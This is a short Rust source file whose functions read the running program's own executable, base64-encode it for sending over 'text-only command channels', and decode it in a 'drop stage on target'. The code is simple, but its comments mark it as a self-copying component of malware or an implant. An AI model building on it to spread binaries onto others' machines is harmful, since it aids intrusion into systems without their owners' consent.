use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use std::fs;
use std::io;

/// Read our own executable image off disk.
pub fn self_bytes() -> io::Result<Vec<u8>> {
    let path = std::env::current_exe()?;
    fs::read(path)
}

/// Base64 the binary so it can ride through text-only command channels.
pub fn self_b64() -> io::Result<String> {
    Ok(STANDARD.encode(self_bytes()?))
}

/// Decode a blob back to bytes (used by the drop stage on target).
pub fn decode(b64: &str) -> Result<Vec<u8>, base64::DecodeError> {
    STANDARD.decode(b64)
}
